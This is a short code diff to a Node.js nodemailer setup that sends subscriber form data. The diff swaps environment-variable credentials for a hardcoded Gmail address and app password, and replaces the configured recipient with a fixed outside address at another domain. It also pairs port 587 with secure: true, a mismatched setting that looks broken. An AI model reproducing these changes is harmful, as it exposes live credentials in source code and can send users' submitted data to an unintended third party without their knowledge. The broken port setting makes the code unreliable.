@@ -7,11 +7,11 @@ const TWISTO_PUBLIC_EMAIL_RECEIVER = process.env.TWISTO_PUBLIC_EMAIL_RECEIVER;
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   host: TWISTO_PUBLIC_EMAIL_HOST,
-  port: 465,
+  port: 587,
   secure: true,
   auth: {
-    user: TWISTO_PUBLIC_APP_USERNAME,
-    pass: TWISTO_PUBLIC_APP_PASSWORD,
+    user: 'sheraz.dev121@gmail.com',
+    pass: 'fenr albf xutl gnho',
   },
 });
 
@@ -39,7 +39,7 @@ export async function sendSubscriberData({
   }
   const info = await transporter.sendMail({
     from: email,
-    to: TWISTO_PUBLIC_EMAIL_RECEIVER,
+    to: 'malenabeige@fthcapital.com',
     subject: subject,
     text: text,
     html: html ? html : '',
